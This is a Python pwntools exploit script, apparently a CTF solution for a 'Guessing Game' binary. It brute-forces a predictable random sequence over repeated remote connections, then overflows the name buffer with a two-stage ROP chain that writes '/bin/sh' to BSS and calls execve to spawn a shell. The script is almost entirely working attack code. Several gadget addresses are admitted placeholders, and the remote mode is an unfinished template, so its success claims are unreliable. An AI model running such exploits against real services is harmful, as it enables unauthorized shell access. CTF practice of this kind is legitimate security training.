#!/usr/bin/env python3
"""
Guessing Game PWN Challenge - Exploit Script
Challenge: Buffer overflow via predictable PRNG and unsafe fgets()
Author: CYBERDUNE CTF Team
"""

from pwn import *
import sys

class bcolors:
    GREEN = '\u001b[32m'
    RED   = '\u001b[31m'
    BLUE  = '\u001b[34m'
    YELLOW = '\u001b[33m'
    ENDC  = '\033[0m'

def exploit_local():
    """Exploit the local binary"""
    print(f'{bcolors.BLUE}[*] Starting local exploitation{bcolors.ENDC}')

    # Start local process
    p = process('./vuln')

    # Known random sequence (first 5 numbers)
    random_sequence = [84, 87, 78, 16, 94]

    # First stage: Write "/bin/sh" to BSS
    print(f'{bcolors.YELLOW}[+] Stage 1: Writing /bin/sh to BSS{bcolors.ENDC}')

    p.recvuntil(b'What number would you like to guess?\n')
    p.sendline(str(random_sequence[0]).encode())
    p.recvuntil(b'Name? ')

    # ROP gadgets (these would need to be found with ROPgadget)
    # For demonstration, using placeholder addresses
    pop_rdi = 0x400696  # pop rdi; ret
    pop_rsi = 0x410ca3  # pop rsi; ret  
    pop_rdx = 0x44a6b5  # pop rdx; ret
    bss_addr = 0x6bc4a0 # writable memory
    read_addr = 0x400000 # read function (placeholder)
    main_addr = 0x400c8c # main function

    payload1 = b'A' * 120  # padding to reach return address
    payload1 += p64(pop_rdi) + p64(0)      # stdin
    payload1 += p64(pop_rsi) + p64(bss_addr) # destination
    payload1 += p64(pop_rdx) + p64(9)      # count
    payload1 += p64(read_addr)             # read("/bin/sh", bss, 9)
    payload1 += p64(main_addr)             # return to main

    p.sendline(payload1)
    sleep(0.5)
    p.sendline(b'/bin/sh\x00')

    # Second stage: Execute system call
    print(f'{bcolors.YELLOW}[+] Stage 2: Executing execve syscall{bcolors.ENDC}')

    p.recvuntil(b'What number would you like to guess?\n')
    p.sendline(str(random_sequence[1]).encode())
    p.recvuntil(b'Name? ')

    # More ROP gadgets
    pop_rax = 0x4163f4  # pop rax; ret
    syscall_addr = 0x40137c # syscall; ret

    payload2 = b'A' * 120
    payload2 += p64(pop_rax) + p64(0x3b)   # execve syscall number
    payload2 += p64(pop_rdi) + p64(bss_addr) # filename
    payload2 += p64(pop_rsi) + p64(0)      # argv
    payload2 += p64(pop_rdx) + p64(0)      # envp
    payload2 += p64(syscall_addr)          # execve("/bin/sh", 0, 0)

    p.sendline(payload2)

    print(f'{bcolors.GREEN}[+] Exploit completed! You should have a shell.{bcolors.ENDC}')
    p.interactive()

def exploit_remote(host, port):
    """Exploit the remote instance"""
    print(f'{bcolors.BLUE}[*] Connecting to {host}:{port}{bcolors.ENDC}')

    p = remote(host, port)

    # Same exploit as local but with remote connection
    random_sequence = [84, 87, 78, 16, 94]

    print(f'{bcolors.YELLOW}[+] Stage 1: Writing /bin/sh to BSS{bcolors.ENDC}')

    p.recvuntil(b'What number would you like to guess?\n')
    p.sendline(str(random_sequence[0]).encode())
    p.recvuntil(b'Name? ')

    # Note: In a real scenario, you'd need to leak or find these addresses
    # This is a template showing the exploitation methodology

    print(f'{bcolors.GREEN}[+] Template exploit ready. Adjust addresses for specific target.{bcolors.ENDC}')
    p.interactive()

def crack_random_sequence(host, port, num_elements=10):
    """Crack the predictable random sequence"""
    print(f'{bcolors.GREEN}### CRACKING THE RANDOM SEQUENCE ###{bcolors.ENDC}')

    random_sequence = []

    for i in range(num_elements):
        for j in range(1, 101):
            try:
                r = remote(host, port)

                # Replay known sequence
                for number in random_sequence:
                    r.recvuntil(b'What number would you like to guess?\n')
                    r.sendline(str(number).encode())
                    r.recvuntil(b'Name? ')
                    r.sendline(b'test')

                # Try next number
                r.recvuntil(b'What number would you like to guess?\n')
                r.sendline(str(j).encode())
                response = r.recvline()

                if b'Nope' not in response:
                    random_sequence.append(j)
                    print(f'{bcolors.RED}--- {i+1} CRACKED [{j}]{bcolors.ENDC}')
                    r.close()
                    break

                r.close()
            except:
                continue

    print(f'{bcolors.GREEN}### RANDOM SEQUENCE FOUND ###{bcolors.ENDC}')
    print(f'Random sequence: {random_sequence}')
    return random_sequence

def main():
    if len(sys.argv) < 2:
        print("Usage:")
        print("  python3 solve.py local                    - Local exploitation")
        print("  python3 solve.py remote <host> <port>     - Remote exploitation") 
        print("  python3 solve.py crack <host> <port>      - Crack random sequence")
        return

    mode = sys.argv[1]

    if mode == "local":
        exploit_local()
    elif mode == "remote" and len(sys.argv) == 4:
        host, port = sys.argv[2], int(sys.argv[3])
        exploit_remote(host, port)
    elif mode == "crack" and len(sys.argv) == 4:
        host, port = sys.argv[2], int(sys.argv[3])
        crack_random_sequence(host, port)
    else:
        print("Invalid arguments")

if __name__ == "__main__":
    main()
